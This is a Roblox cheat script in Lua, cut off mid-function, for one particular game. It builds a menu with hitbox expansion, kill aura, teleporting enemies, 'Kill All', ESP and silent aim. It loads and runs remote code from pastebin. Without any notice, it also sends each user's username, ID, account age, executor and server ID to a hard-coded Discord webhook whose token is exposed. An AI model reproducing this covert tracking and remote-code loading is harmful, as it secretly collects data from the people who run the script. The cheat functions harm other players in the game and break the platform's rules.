if game.PlaceId == 6924758805 then

local Library = loadstring(game:HttpGet("https://pastebin.com/raw/Le0Aq8B7"))()
local colors = {
    SchemeColor = Color3.fromRGB(255, 87, 34),
    Background = Color3.fromRGB(36, 36, 36),
    Header = Color3.fromRGB(54, 54, 54),
    TextColor = Color3.fromRGB(255, 255, 255),
    ElementColor = Color3.fromRGB(121, 85, 72)
}
local Window = Library.CreateLib("CapybaraScript", colors)

local CapyScreen = Instance.new("ScreenGui")
local CapyToggleUI = Instance.new("TextButton")
local CapyCornerUI = Instance.new("UICorner")
local CapyImageUI = Instance.new("ImageLabel")
local CapyImageCornerUI = Instance.new("UICorner")

CapyScreen.Name = "DANGGOHUBScreen"
CapyScreen.Parent = game.CoreGui
CapyScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
CapyScreen.ResetOnSpawn = false

CapyToggleUI.Name = "CapyToggleUI"
CapyToggleUI.Parent = CapyScreen
CapyToggleUI.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
CapyToggleUI.Position = UDim2.new(0.12, 0, 0.1, 0)
CapyToggleUI.Size = UDim2.new(0, 40, 0, 40)
CapyToggleUI.Text = ""
CapyToggleUI.Draggable = true
CapyToggleUI.MouseButton1Click:Connect(function()
    if Library and Library.ToggleUI then
        Library:ToggleUI()
    end
end)

CapyCornerUI.Name = "CapyCornerUI"
CapyCornerUI.CornerRadius = UDim.new(1, 0)
CapyCornerUI.Parent = CapyToggleUI

CapyImageUI.Name = "CapyImageUI"
CapyImageUI.Parent = CapyToggleUI
CapyImageUI.BackgroundColor3 = Color3.fromRGB(192, 192, 192)
CapyImageUI.BorderSizePixel = 0
CapyImageUI.Size = UDim2.new(1, 0, 1, 0)
CapyImageUI.Image = "rbxassetid://98340377583067"

CapyImageCornerUI.Name = "CapyImageCornerUI"
CapyImageCornerUI.CornerRadius = UDim.new(1, 0)
CapyImageCornerUI.Parent = CapyImageUI

local CombateTab = Window:NewTab("Combat")
local HitboxTab = Window:NewTab("Hitbox expander")
local VisualTab = Window:NewTab("Visual")
local HitboxSection = HitboxTab:NewSection("Opciones Hitbox expander")
local VisualSection = VisualTab:NewSection("Opciones Visuales")
local CombateSection = CombateTab:NewSection("Opciones Combat")

local webhookURL = "https://discord.com/api/webhooks/1295255397183131668/pRh7yJ3rU7yFvHxvgIdhyy-R_e_Oa3DONJUcevi4wCG7OjCta8BnRQECDnXoUn3YJaTL"

local player = game:GetService("Players").LocalPlayer
local username = player.Name
local userId = player.UserId
local accountAge = player.AccountAge

local executor = "Unknown Executor"

if syn then
    executor = "Synapse X"
elseif KRNL_LOADED then
    executor = "KRNL"
elseif fluxus then
    executor = "Fluxus"
elseif evon then
    executor = "Evon"
elseif Arceus then
    executor = "Arceus X"
elseif wave then
    executor = "Wave"
elseif codex then
    executor = "Codex"
elseif vega_x then
    executor = "Vega X"
elseif delta then
    executor = "Delta"
elseif solara then
    executor = "Solara"
elseif cryptic then
    executor = "Cryptic"
elseif trigon then
    executor = "Trigon"
elseif MantiPWF then
    executor = "MantiPWF"
else
    if identifyexecutor then
        executor = identifyexecutor()
    elseif getexecutorname then
        executor = getexecutorname()
    end
end

local jobId = game.JobId or "Unknown Job ID"

local function sendToDiscord(message)
    local request = http_request or request or syn.request or http.request
    if not request then
        warn("Executor tidak mendukung HTTP Requests.")
        return
    end

    local data = {
        ["content"] = message,
        ["embeds"] = {{
            ["title"] = "Roblox Executor Notification",
            ["fields"] = {
                {["name"] = "User:", ["value"] = "```" .. username .. "```", ["inline"] = false},
                {["name"] = "User ID:", ["value"] = "```" .. tostring(userId) .. "```", ["inline"] = false},
                {["name"] = "User Age:", ["value"] = "```" .. tostring(accountAge) .. "```", ["inline"] = false},
                {["name"] = "Executor", ["value"] = "```" .. executor .. "```", ["inline"] = false},
                {["name"] = "Job ID:", ["value"] = "```" .. jobId .. "```", ["inline"] = false}
            },
            ["color"] = 65280 -- Warna merah
        }}
    }

    request({
        Url = webhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode(data)
    })
end

sendToDiscord("Execute!")

local tpwalking = false
local distanceMultiplier = 0.3

local function tpwalk(character)
    local humanoid = character:WaitForChild("Humanoid")
    tpwalking = true

    while tpwalking and character and humanoid and humanoid.Parent do
        local delta = game:GetService("RunService").Heartbeat:Wait()
        local moveDirection = humanoid.MoveDirection

        if moveDirection.Magnitude > 0 then
            local teleportOffset = moveDirection * distanceMultiplier * delta * 10
            character:TranslateBy(teleportOffset)
        end
    end
end

local function onCharacterAdded(character)
    if tpwalking then
        tpwalk(character)
    end
end

game.Players.LocalPlayer.CharacterAdded:Connect(onCharacterAdded)

CombateSection:NewToggle("Tp walk", "ToggleInfo", function(state)
    if state then
        tpwalking = true
        local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
        tpwalk(character)
    else
        tpwalking = false
    end
end)

CombateSection:NewTextBox("speed", "Introduce un valor num√©rico", function(value)
    local newSpeed = tonumber(value)
    if newSpeed then
        distanceMultiplier = newSpeed
    end
end)

local hitboxSize = 1
local hitboxTransparency = 0.7
local hitboxCollisionEnabled = false
local hitboxColor = Color3.fromRGB(255, 255, 255)
local hitboxEnabled = false

local connection

local function isCharacterValid(character)
    return character and character:FindFirstChild("HumanoidRootPart")
end

local function updateHitboxesIfEnabled()
    if hitboxEnabled then
        hitboxes(true)
    end
end

local function hitboxes(enable)
    for _, player in pairs(game:GetService("Players"):GetPlayers()) do
        if player ~= game:GetService("Players").LocalPlayer then
            local character = player.Character
            if isCharacterValid(character) then
                local rootPart = character.HumanoidRootPart
                rootPart.CanCollide = hitboxCollisionEnabled
                if enable then
                    rootPart.Transparency = hitboxTransparency
                    rootPart.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
                    rootPart.Color = hitboxColor
                else
                    rootPart.Transparency = 1
                    rootPart.Size = Vector3.new(1, 1, 1)
                end
            end
        end
    end
end

local function updateHitboxColor()
    hitboxColor = Color3.fromRGB(255, 255, 255)
    updateHitboxesIfEnabled()
end

HitboxSection:NewToggle("Hitbox Expander", "ToggleInfo", function(state)
    hitboxEnabled = state

    if connection then
        connection:Disconnect()
    end

    if hitboxEnabled then
        hitboxes(true)
        connection = game:GetService("RunService").Stepped:Connect(function()
            hitboxes(true)
        end)
    else
        hitboxes(false)
    end
end)

HitboxSection:NewTextBox("Hitbox Size", "Enter size value", function(value)
    local newSize = tonumber(value)
    if newSize then
        hitboxSize = newSize
    else
        hitboxSize = 1
    end
    updateHitboxesIfEnabled()
end)

HitboxSection:NewTextBox("Hitbox Transparency", "Enter transparency value", function(value)
    local newTransparency = tonumber(value)
    if newTransparency then
        hitboxTransparency = math.clamp(newTransparency / 10, 0, 1)
    else
        hitboxTransparency = 0.7
    end
    updateHitboxesIfEnabled()
end)

HitboxSection:NewTextBox("Red", "Enter Red value (0-255)", function(value)
    local newRed = tonumber(value)
    if newRed then
        hitboxColor = Color3.fromRGB(math.clamp(newRed, 0, 255), hitboxColor.G, hitboxColor.B)
    else
        hitboxColor = Color3.fromRGB(255, hitboxColor.G, hitboxColor.B)
    end
    updateHitboxesIfEnabled()
end)

HitboxSection:NewTextBox("Green", "Enter Green value (0-255)", function(value)
    local newGreen = tonumber(value)
    if newGreen then
        hitboxColor = Color3.fromRGB(hitboxColor.R, math.clamp(newGreen, 0, 255), hitboxColor.B)
    else
        hitboxColor = Color3.fromRGB(hitboxColor.R, 255, hitboxColor.B)
    end
    updateHitboxesIfEnabled()
end)

HitboxSection:NewTextBox("Blue", "Enter Blue value (0-255)", function(value)
    local newBlue = tonumber(value)
    if newBlue then
        hitboxColor = Color3.fromRGB(hitboxColor.R, hitboxColor.G, math.clamp(newBlue, 0, 255))
    else
        hitboxColor = Color3.fromRGB(hitboxColor.R, hitboxColor.G, 255)
    end
    updateHitboxesIfEnabled()
end)

HitboxSection:NewToggle("Hitbox Collision", "ToggleInfo", function(state)
    hitboxCollisionEnabled = state
    updateHitboxesIfEnabled()
end)

local RunService = game:GetService("RunService")
local player = game.Players.LocalPlayer

local knifeEquipped = false
local auraActive = false
local auraConnection
local humanoidRootPart
local lastSlashTime = 0
local slashInterval = 0.5

local function getHumanoidRootPart(character)
    if character then
        return character:WaitForChild("HumanoidRootPart", 2)
    end
    return nil
end

player.CharacterAdded:Connect(function(character)
    humanoidRootPart = getHumanoidRootPart(character)
end)

if player.Character then
    humanoidRootPart = getHumanoidRootPart(player.Character)
end

local function equipKnife()
    local knife = player.Backpack:FindFirstChild("Knife")
    if not knifeEquipped and knife then
        knife.Parent = player.Character
        knifeEquipped = true
    end
end

local function unequipKnife()
    local knife = player.Character:FindFirstChild("Knife")
    if knifeEquipped and knife then
        knife.Parent = player.Backpack
        knifeEquipped = false
    end
end

local function findNearbyPlayer()
    local nearestPlayer = nil
    local nearestDistance = 7.3

    for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
        if otherPlayer ~= player and otherPlayer.Character then
            local otherHumanoidRootPart = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
            if otherHumanoidRootPart then
                local distance = (humanoidRootPart.Position - otherHumanoidRootPart.Position).Magnitude
                if distance <= nearestDistance then
                    nearestPlayer = otherPlayer
                    break
                end
            end
        end
    end
    return nearestPlayer
end

local function handleAura()
    if not auraActive or not humanoidRootPart then
        return
    end

    local target = findNearbyPlayer()
    if target then
        equipKnife()
        if knifeEquipped then
            local currentTime = tick()
            if currentTime - lastSlashTime >= slashInterval then
                local args = { [1] = 1 }
                game:GetService("Players").LocalPlayer.Character.Knife.KnifeServer.SlashStart:FireServer(unpack(args))
                lastSlashTime = currentTime
            end
        end
    else
        unequipKnife()
    end
end

local function StartKnifeAura()
    if auraConnection then auraConnection:Disconnect() end
    auraActive = true
    auraConnection = RunService.Heartbeat:Connect(handleAura)
end

local function StopKnifeAura()
    auraActive = false
    unequipKnife()
    if auraConnection then
        auraConnection:Disconnect()
        auraConnection = nil
    end
end

CombateSection:NewToggle("Knife Aura", "ToggleInfo", function(state)
    if state then
        StartKnifeAura()
    else
        StopKnifeAura()
    end
end)

RunService.Heartbeat:Connect(function()
    if auraActive and not humanoidRootPart and player.Character then
        humanoidRootPart = getHumanoidRootPart(player.Character)
    end
end)

CombateSection:NewToggle("Kill aura", "Activa o desactiva el script", function(state)
    scriptActive = state
end)

CombateSection:NewTextBox("Detection Radius Kill Aura", "Escribe el radio de detecci√≥n para los enemigos", function(value)
    detectionRadius = tonumber(value) or 9.4
end)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local humanoidRootPart
local tpOffset = 2.8

local function hasKnife()
    local backpack = player:FindFirstChild("Backpack")
    if backpack and backpack:FindFirstChild("Knife") then
        return true
    end
    local character = player.Character
    if character and character:FindFirstChild("Knife") then
        return true
    end
    return false
end

local function getHumanoidRootPart(character)
    if character then
        return character:WaitForChild("HumanoidRootPart", 2)
    end
    return nil
end

local function teleportEnemy(enemy)
    if humanoidRootPart and enemy then
        local enemyRoot = enemy:FindFirstChild("HumanoidRootPart")
        if enemyRoot then
            local forwardDirection = humanoidRootPart.CFrame.LookVector
            local teleportPosition = humanoidRootPart.Position + forwardDirection * tpOffset
            enemyRoot.CFrame = CFrame.new(teleportPosition)
        end
    end
end

local function findClosestPlayer()
    local closestPlayer = nil
    local closestDistance = detectionRadius

    for _, otherPlayer in ipairs(Players:GetPlayers()) do
        if otherPlayer ~= player and otherPlayer.Character then
            local otherRoot = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
            if otherRoot then
                local distance = (otherRoot.Position - humanoidRootPart.Position).Magnitude
                if distance < closestDistance then
                    closestPlayer = otherPlayer
                    closestDistance = distance
                end
            end
        end
    end

    return closestPlayer
end

local function teleportClosestPlayer()
    if scriptActive and humanoidRootPart and hasKnife() then
        local closestPlayer = findClosestPlayer()
        if closestPlayer and closestPlayer.Character then
            teleportEnemy(closestPlayer.Character)
        end
    end
end

player.CharacterAdded:Connect(function(character)
    humanoidRootPart = getHumanoidRootPart(character)
end)

humanoidRootPart = getHumanoidRootPart(player.Character)

RunService.Heartbeat:Connect(function()
    if scriptActive and hasKnife() and humanoidRootPart then
        teleportClosestPlayer()
    end
end)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Player = Players.LocalPlayer
local espTransparency = 0.6
local espConnection
local visibleColor = Color3.new(0, 1, 0)
local hiddenColor = Color3.new(1, 0, 0)

local function clearESP()
    for _, otherPlayer in pairs(Players:GetPlayers()) do
        if otherPlayer ~= Player and otherPlayer.Character then
            local highlight = otherPlayer.Character:FindFirstChild("Highlight")
            if highlight then
                highlight:Destroy()
            end
        end
    end
end

local function updateESP()
    for _, otherPlayer in pairs(Players:GetPlayers()) do
        if otherPlayer ~= Player and otherPlayer.Character then
            local humanoidRootPart = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
            if humanoidRootPart then
                local highlight = otherPlayer.Character:FindFirstChild("Highlight")
                if not highlight then
                    highlight = Instance.new("Highlight")
                    highlight.Parent = otherPlayer.Character
                end

                highlight.FillTransparency = espTransparency
                highlight.OutlineTransparency = 0
                highlight.Enabled = true

                local rayOrigin = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") and Player.Character.HumanoidRootPart.Position
                if rayOrigin then
                    local rayDirection = (humanoidRootPart.Position - rayOrigin).Unit * (humanoidRootPart.Position - rayOrigin).Magnitude
                    local raycastParams = RaycastParams.new()
                    raycastParams.FilterDescendantsInstances = {Player.Character}
                    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
                    raycastParams.IgnoreWater = true

                    local raycastResult = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
                    if raycastResult and raycastResult.Instance and not raycastResult.Instance:IsDescendantOf(otherPlayer.Character) then
                        highlight.FillColor = hiddenColor
                    else
                        highlight.FillColor = visibleColor
                    end
                end
            end
        end
    end
end

VisualSection:NewToggle("ESP Player with Raycasting", "Enable or disable the ESP", function(state)
    if state then
        if not espConnection then
            espConnection = RunService.Heartbeat:Connect(updateESP)
        end
    else
        if espConnection then
            espConnection:Disconnect()
            espConnection = nil
        end
        clearESP()
    end
end)

VisualSection:NewTextBox("ESP Transparency", "Set the transparency of the ESP", function(value)
    espTransparency = tonumber(value) or espTransparency
    if espConnection then
        updateESP()
    end
end)

VisualSection:NewColorPicker("Color Visible", "Select the color for visible players", visibleColor, function(color)
    visibleColor = color
end)

VisualSection:NewColorPicker("Color Hidden", "Select the color for hidden players", hiddenColor, function(color)
    hiddenColor = color
end)

CombateSection:NewButton("FAKE SPEED GLICH", "ButtonInfo", function()
local existingGui = game:GetService("CoreGui"):FindFirstChild("fakespeed")
if existingGui then
    return
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "fakespeed"
screenGui.Parent = game:GetService("CoreGui")

local button = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")

button.Name = "Button"
button.Size = UDim2.new(0, 50, 0, 50)
button.Position = UDim2.new(0.5, -10, 0.5, -25)
button.Text = "OFF"
button.Font = Enum.Font.Gotham
button.TextSize = 14
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
button.BackgroundTransparency = 0.6
button.Draggable = true
button.BorderSizePixel = 0
button.Parent = screenGui

UICorner.CornerRadius = UDim.new(0, 15)
UICorner.Parent = button

local isActive = false
local slidingConnection

local function toggleButton()
    isActive = not isActive
    if isActive then
        button.Text = "ON"
        button.BackgroundColor3 = Color3.fromRGB(173, 216, 230)
    else
        button.Text = "OFF"
        button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    end
end

button.MouseButton1Click:Connect(toggleButton)

local player = game.Players.LocalPlayer
local slidingSpeed = 3
local maxSlidingSpeed = 15 
local acceleration = 0.2
local deceleration = 0.1
local landingDeceleration = 0.05
local slideAfterLandSpeed = 2
local slideAfterLandDuration = 0.3

local function setupCharacter(character)
    local humanoid = character:WaitForChild("Humanoid")
    local landed = false
    local slideTime = 0

    local function isInAir()
        return humanoid:GetState() == Enum.HumanoidStateType.Freefall
    end

    local function isLanding()
        return humanoid:GetState() == Enum.HumanoidStateType.Landed
    end

    if slidingConnection then
        slidingConnection:Disconnect()
    end

    slidingConnection = game:GetService("RunService").RenderStepped:Connect(function(deltaTime)
        if isInAir() and isActive then
            local direction = humanoid.MoveDirection
            if direction.Magnitude > 0 then
                slidingSpeed = math.min(slidingSpeed + acceleration, maxSlidingSpeed)
                character:TranslateBy(direction * slidingSpeed * deltaTime)
            else
                slidingSpeed = math.max(slidingSpeed - deceleration, 0)
            end
        elseif isLanding() then
            if not landed then
                slidingSpeed = slideAfterLandSpeed
                slideTime = 0
                landed = true
            end
        elseif landed then
            if slideTime < slideAfterLandDuration then
                character:TranslateBy(humanoid.MoveDirection * slidingSpeed * deltaTime)
                slideTime = slideTime + deltaTime
                slidingSpeed = math.max(slidingSpeed - landingDeceleration, 0)
            else
                landed = false
            end
        else
            slidingSpeed = math.max(slidingSpeed - deceleration, 0)
        end
    end)
end

player.CharacterAdded:Connect(setupCharacter)
if player.Character then
    setupCharacter(player.Character)
end
end)

CombateSection:NewButton("Knife aim", "ButtonInfo", function()
local existingGui = game:GetService("CoreGui"):FindFirstChild("mygui")
if existingGui then
    return
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "mygui"
screenGui.Parent = game:GetService("CoreGui")

local button = Instance.new("TextButton")
local teamCheckButton = Instance.new("TextButton")
local sharpShooterButton = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")

button.Name = "MyButton"
button.Size = UDim2.new(0, 120, 0, 120)
button.Position = UDim2.new(1, -110, 0, 50)
button.Text = ""
button.Font = Enum.Font.Gotham
button.TextSize = 14
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
button.BackgroundTransparency = 0.6
button.BorderSizePixel = 2
button.BorderColor3 = Color3.fromRGB(0, 0, 0)
button.Draggable = true
button.TextScaled = true
button.Parent = screenGui

teamCheckButton.Name = "TeamCheckButton"
teamCheckButton.Size = UDim2.new(0, 120, 0, 40)
teamCheckButton.Position = UDim2.new(0, 10, 0, 10)
teamCheckButton.Text = "Team Check: ON"
teamCheckButton.Font = Enum.Font.Gotham
teamCheckButton.TextSize = 14
teamCheckButton.TextColor3 = Color3.fromRGB(255, 255, 255)
teamCheckButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
teamCheckButton.BackgroundTransparency = 0.6
teamCheckButton.BorderSizePixel = 2
teamCheckButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
teamCheckButton.Draggable = true
teamCheckButton.TextScaled = true
teamCheckButton.Parent = screenGui

sharpShooterButton.Name = "SharpShooterButton"
sharpShooterButton.Size = UDim2.new(0, 120, 0, 40)
sharpShooterButton.Position = UDim2.new(0, 140, 0, 10)
sharpShooterButton.Text = "Sharp Knife: OFF"
sharpShooterButton.Font = Enum.Font.Gotham
sharpShooterButton.TextSize = 14
sharpShooterButton.TextColor3 = Color3.fromRGB(255, 255, 255)
sharpShooterButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
sharpShooterButton.BackgroundTransparency = 0.6
sharpShooterButton.BorderSizePixel = 2
sharpShooterButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
sharpShooterButton.Draggable = true
sharpShooterButton.TextScaled = true
sharpShooterButton.Parent = screenGui

UICorner.CornerRadius = UDim.new(0, 15)
UICorner.Parent = button
UICorner.Parent = teamCheckButton
UICorner.Parent = sharpShooterButton

local player = game.Players.LocalPlayer
local camera = game.Workspace.CurrentCamera

local teamCheckEnabled = true
local isSharpShooterActive = false

local function isPlayerVisible(target)
    local targetPosition = target.Character.HumanoidRootPart.Position
    local screenPoint = camera:WorldToScreenPoint(targetPosition)
    return screenPoint.Z > 0 and screenPoint.Y > 0 and screenPoint.Y < camera.ViewportSize.Y and screenPoint.X > 0 and screenPoint.X < camera.ViewportSize.X
end

local function getClosestVisibleEnemy()
    local closestEnemy = nil
    local closestDistance = math.huge

    for _, enemy in ipairs(game.Players:GetPlayers()) do
        if enemy ~= player and enemy.Character and enemy.Character:FindFirstChild("HumanoidRootPart") then
            if not teamCheckEnabled or enemy.Team ~= player.Team then
                local distance = (player.Character.HumanoidRootPart.Position - enemy.Character.HumanoidRootPart.Position).Magnitude
                if distance < closestDistance and isPlayerVisible(enemy) then
                    closestDistance = distance
                    closestEnemy = enemy
                end
            end
        end
    end

    return closestEnemy
end

local function onButtonClick()
    button.BackgroundColor3 = Color3.fromRGB(173, 216, 230)

    local target = getClosestVisibleEnemy()

    if target then
        local targetPosition = target.Character.HumanoidRootPart.Position

        local flingArgs = {
            CFrame.new(targetPosition.X, targetPosition.Y + 1, targetPosition.Z),
            Vector3.new(targetPosition.X, targetPosition.Y + 1, targetPosition.Z)
        }

        game:GetService("Players").LocalPlayer.Character.Knife.KnifeServer.FlingKnife:FireServer(unpack(flingArgs))
        
        local args = { [1] = 1 }
        game:GetService("Players").LocalPlayer.Character.Knife.KnifeServer.SetKnifeGoneTime:FireServer(unpack(args))
    end

    wait(0.02)
    button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
end

button.MouseButton1Click:Connect(onButtonClick)

local function toggleTeamCheck()
    teamCheckEnabled = not teamCheckEnabled
    if teamCheckEnabled then
        teamCheckButton.Text = "Team Check: ON"
    else
        teamCheckButton.Text = "Team Check: OFF"
    end
end

teamCheckButton.MouseButton1Click:Connect(toggleTeamCheck)

local function toggleSharpShooter()
    isSharpShooterActive = not isSharpShooterActive
    if isSharpShooterActive then
        sharpShooterButton.Text = "Sharp Knife: ON"
    else
        sharpShooterButton.Text = "Sharp Knife: OFF"
    end
end

sharpShooterButton.MouseButton1Click:Connect(toggleSharpShooter)

local function getPing()
    local stats = player:FindFirstChild("Stats")
    if stats and stats:FindFirstChild("Ping") then
        return stats.Ping.Value
    end
    return 0
end

local function isTargetInAir(targetCharacter)
    if not targetCharacter then return false end
    local humanoid = targetCharacter:FindFirstChild("Humanoid")
    if humanoid then
        return humanoid.FloorMaterial == Enum.Material.Air
    end
    return false
end

local function calculateOffset(ping, distanceToClosestPlayer, isTargetInAir, isTargetSmallHitbox)
    local horizontalOffset = 0.30
    local verticalOffset = 0

    if ping > 120 then
        horizontalOffset = 0.20
        verticalOffset = -0.03
    elseif ping <= 50 then
        horizontalOffset = 0.05
        verticalOffset = 0
    elseif ping <= 60 then
        horizontalOffset = 0.1
        verticalOffset = 0
    elseif ping <= 70 then
        horizontalOffset = 0.2
        verticalOffset = 0
    elseif ping <= 80 then
        horizontalOffset = 0.3
        verticalOffset = 0
    elseif ping <= 90 then
        horizontalOffset = 0.35
        verticalOffset = 0
    end

    if distanceToClosestPlayer and distanceToClosestPlayer < 2 then
        horizontalOffset = horizontalOffset * 0.2
        verticalOffset = verticalOffset * 0.2
    end

    if distanceToClosestPlayer and distanceToClosestPlayer > 18 then
        horizontalOffset = horizontalOffset * 0.63
    end

    if isTargetInAir then
        horizontalOffset = horizontalOffset * 0.2
    end

    verticalOffset = math.clamp(verticalOffset, -0.15, 0.2)

    return horizontalOffset, verticalOffset
end

local function predictPosition(targetCharacter, distanceToClosestPlayer)
    local humanoidRootPart = targetCharacter:FindFirstChild("HumanoidRootPart")
    if humanoidRootPart then
        local targetPosition = humanoidRootPart.Position
        local targetVelocity = humanoidRootPart.Velocity
        local distanceToPlayer = (targetPosition - player.Character.HumanoidRootPart.Position).Magnitude

        local predictionTime = math.clamp(distanceToPlayer / 50, 0, 0.1)
        local predictedPosition = targetPosition + targetVelocity * predictionTime

        local ping = getPing()
        local inAir = isTargetInAir(targetCharacter)
        local humanoid = targetCharacter:FindFirstChild("Humanoid")
        local smallHitbox = false
        if humanoid then
            local success, result = pcall(function() return humanoid.HipWidth end)
            if success then
                smallHitbox = result < 2
            end
        end

        local horizontalOffset, verticalOffset = calculateOffset(ping, distanceToClosestPlayer, inAir, smallHitbox)

        predictedPosition = predictedPosition + Vector3.new(horizontalOffset, verticalOffset, 0)

        return Vector3.new(predictedPosition.X, targetPosition.Y, predictedPosition.Z)
    end
    return nil
end

local function getClosestPlayer()
    local localHumanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not localHumanoidRootPart then
        repeat
            wait(0.1)
            localHumanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        until localHumanoidRootPart
    end
    local closestPlayer = nil
    local closestDistance = math.huge
    local closestDistanceToClosestPlayer = math.huge

    for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
        if otherPlayer ~= player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local distance = (localHumanoidRootPart.Position - otherPlayer.Character.HumanoidRootPart.Position).Magnitude
            if distance < closestDistance then
                closestDistance = distance
                closestPlayer = otherPlayer
            end
        end
    end
    return closestPlayer
end

end) 

CombateSection:NewButton("Kill All [with Knife Only]", "ButtonInfo", function()
local Players = game:GetService("Players")
local Plr = Players.LocalPlayer

local knife = Plr.Backpack:FindFirstChild("Knife") or Plr.Character:FindFirstChild("Knife")
if not knife then
    return
end

local localPosition = Plr.Character.HumanoidRootPart.Position
local forwardVector = Plr.Character.HumanoidRootPart.CFrame.LookVector
local teleportPosition = localPosition + forwardVector * 2.7

if knife.Parent ~= Plr.Character then
    knife.Parent = Plr.Character
    repeat task.wait(0.1) until Plr.Character:FindFirstChild("Knife")
end

for attackCount = 1, 10 do
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= Plr and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local humanoidRootPart = player.Character.HumanoidRootPart

            humanoidRootPart.CFrame = CFrame.new(teleportPosition)

            humanoidRootPart.Anchored = true
        end
    end

    game:GetService("Players").LocalPlayer.Character.Knife.KnifeServer.SlashStart:FireServer(1)
    task.wait(0.1)
end

for _, player in ipairs(Players:GetPlayers()) do
    if player ~= Plr and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        local humanoidRootPart = player.Character.HumanoidRootPart
        humanoidRootPart.Anchored = false
    end
end
    end)
CombateSection:NewToggle("Silent aim [no team check sorry]", "Activa o desactiva el script", function(state)
    isScriptActive = state
end)

CombateSection:NewToggle("Sharp Shooter", "Mejora la precisi√≥n del disparo", function(state)
    isSharpShooterActive = state
end)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

local debounceTime = 0.1
local lastFireTime = 0
local moveThreshold = 1000
local initialTouchPosition = nil

local isScriptActive = true
local isSharpShooterActive = true

local function getPing()
    local stats = LocalPlayer:FindFirstChild("Stats")
    if stats and stats:FindFirstChild("Ping") then
        return stats.Ping.Value
    end
    return 0
end

local function isTargetInAir(targetCharacter)
    if not targetCharacter then return false end
    local humanoid = targetCharacter:FindFirstChild("Humanoid")
    if humanoid then
        return humanoid.FloorMaterial == Enum.Material.Air
    end
    return false
end

local function calculateOffset(ping, distanceToClosestPlayer, isTargetInAir, isTargetSmallHitbox)
    local horizontalOffset = 0.60
    local verticalOffset = 0

    if ping > 120 then
        horizontalOffset = 0.47
        verticalOffset = -0.03
    end

if ping <= 50 then
    horizontalOffset = 0.2
    verticalOffset = 0
elseif ping <= 60 then
    horizontalOffset = 0.3
    verticalOffset = 0
elseif ping <= 70 then
    horizontalOffset = 0.6
    verticalOffset = 0
elseif ping <= 80 then
    horizontalOffset = 0.7
    verticalOffset = 0
elseif ping <= 90 then
    horizontalOffset = 0.8
    verticalOffset = 0
end

    if isSharpShooterActive then
        horizontalOffset = horizontalOffset * 0.75
        verticalOffset = verticalOffset * 0.60
    else
        if isTargetSmallHitbox then
            horizontalOffset = horizontalOffset * 0.25
            verticalOffset = verticalOffset * 0.2
        end

        if distanceToClosestPlayer and distanceToClosestPlayer < 2 then
            horizontalOffset = horizontalOffset * 0.2
            verticalOffset = verticalOffset * 0.2
        end

        if distanceToClosestPlayer and distanceToClosestPlayer > 18 then
            horizontalOffset = horizontalOffset * 0.63
        end

        if isTargetInAir then
            horizontalOffset = horizontalOffset * 0.2
        end
    end

    verticalOffset = math.clamp(verticalOffset, -0.15, 0.2)

    return horizontalOffset, verticalOffset
end

local function predictPosition(targetCharacter, distanceToClosestPlayer)
    local humanoidRootPart = targetCharacter:FindFirstChild("HumanoidRootPart")
    if humanoidRootPart then
        local targetPosition = humanoidRootPart.Position
        local targetVelocity = humanoidRootPart.Velocity
        local distanceToPlayer = (targetPosition - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude

        local predictionTime = math.clamp(distanceToPlayer / 50, 0, 0.1)
        local predictedPosition = targetPosition + targetVelocity * predictionTime

        local ping = getPing()
        local inAir = isTargetInAir(targetCharacter)
        local humanoid = targetCharacter:FindFirstChild("Humanoid")
        local smallHitbox = false
        if humanoid then
            local success, result = pcall(function() return humanoid.HipWidth end)
            if success then
                smallHitbox = result < 2
            end
        end

        local horizontalOffset, verticalOffset = calculateOffset(ping, distanceToClosestPlayer, inAir, smallHitbox)

        if isSharpShooterActive then
            return humanoidRootPart.Position + targetVelocity * predictionTime
        end

        predictedPosition = predictedPosition + Vector3.new(horizontalOffset, verticalOffset, 0)

        return Vector3.new(predictedPosition.X, targetPosition.Y, predictedPosition.Z)
    end
    return nil
end

local function getClosestPlayer()
    local localHumanoidRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not localHumanoidRootPart then
        repeat
            wait(0.1)
            localHumanoidRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        until localHumanoidRootPart
    end

    local closestPlayer = nil
    local shortestDistance = math.huge
